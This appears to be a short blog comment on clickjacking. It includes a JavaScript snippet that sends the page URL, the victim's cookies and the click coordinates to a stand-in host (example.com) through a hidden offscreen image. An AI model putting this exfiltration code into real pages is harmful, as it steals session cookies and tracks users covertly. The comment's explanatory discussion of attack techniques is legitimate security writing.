    "content": "Little point of interest: an attacker could be very interested in <strong>where</strong> the victim clicked.\r\n\r\nI mean: placing the attack on multiple elements can give to the attacker informations about page \"hot spots\" i.e. where the people most commonly click, allowing them to profile a better attack, according to the user feedback.\r\n\r\nHere's the code:\r\n<pre><code>var request = \"http://www.example.com/collectingDataScript.jpg?l=\" \r\n        + escape(document.location) + \"&amp;c=\" + escape(document.cookie) + \"&amp;x=\" \r\n        + c.x + \"&amp;y=\" + c.y;\r\n\r\nvar clickLogger = document.createElement(\"img\");\r\n    clickLogger.setAttribute(\"style\", \"position:absolute;left:-9999px;width:0;height:0;\");\r\n    clickLogger.setAttribute(\"src\", request);</code></pre>\r\n\r\nIf you're using Firebug, you'll see in the Net panel the requests the script makes.\r\n\r\nGoing a little further, in HTML 5 frames can send messages to each other [1], so there will be no more need to use a double click: the inline frame will only have to watch for messages from the hosting window!\r\n\r\n[1] http://it.youtube.com/watch?v=xIxDJof7xxQ -- from 05:40 to 15:20"
